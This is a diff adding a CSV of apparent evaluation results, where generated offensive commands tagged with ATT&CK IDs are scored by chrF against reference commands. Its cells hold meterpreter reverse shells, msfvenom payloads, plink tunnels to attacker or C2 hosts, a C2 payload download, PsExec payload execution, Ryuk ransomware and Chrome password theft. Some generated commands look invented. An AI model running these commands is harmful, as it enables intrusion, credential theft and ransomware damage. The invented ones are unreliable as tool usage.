@@ -1,0 +1,34 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_metasploit_TA0002_T1129.txt,metasploit,"msfconsole -x ""use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",40.544,True
+command_metasploit_TA0003_T1543.txt,metasploit,"msfdb -n ""Windows_Service"" -o ""mof"" upload <mof_file>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,19.228,True
+command_metasploit_TA0004_T1543.txt,metasploit,msfdb --component db_connect -n <name> -u your_current_account_name -p super_secret_password -t super_secret_api_token,"```
+    use post/windows/manage/run_as
+    set CMD ""netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900""
+    set DOMAIN <domain_full>
+    set PASSWORD <domain_admin_password>
+    set USER <domain_admin>
+    set SESSION 3
+    exploit
+    ```",18.207,True
+command_plink_TA0011_T1105.txt,plink,plink -share <c2_server>,"```sh
+plink -ssh #{user}@#{server}
+```",38.294,True
+command_plink_TA0011_T1105.txt,plink,"plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> ""git clone https://github.com/teamtnt/CobaltStrike.git""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",33.488,True
+command_plink_TA0011_T1105.txt,plink,"plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> ""mkdir /path/to/payload && cd /path/to/payload && curl https://example.com/c2_payload > payload.dll && mv payload.dll /path/to/payload/payload.dll""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",21.993,True
+command_plink_TA0011_T1105.txt,plink,"plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> ""git pull https://github.com/teamtnt/CobaltStrike.git""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",33.581,True
+command_psexec_TA0008_T1021.txt,psexec,psexec -u <remote_username> -p <password> -r <remote_service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",23.722,True
+command_psexec_TA0008_T1021.txt,psexec,psexec -i -u <remote_username> -p <password> -r <remote_service_name> -w <working_directory>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",22.27,True
+command_psexec_TA0008_T1021.txt,psexec,psexec -s -u <remote_username> -p <password> -r <remote_service_name> -x,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",23.392,True
+command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject-lockergoga,`ryuk.exe --encrypt --process-name notepad.exe`,33.776,True
+command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --mount-discoverable-shares --stop-services --delete-backups --encrypt-files,`ryuk.exe --encrypt --process-name notepad.exe`,26.448,True
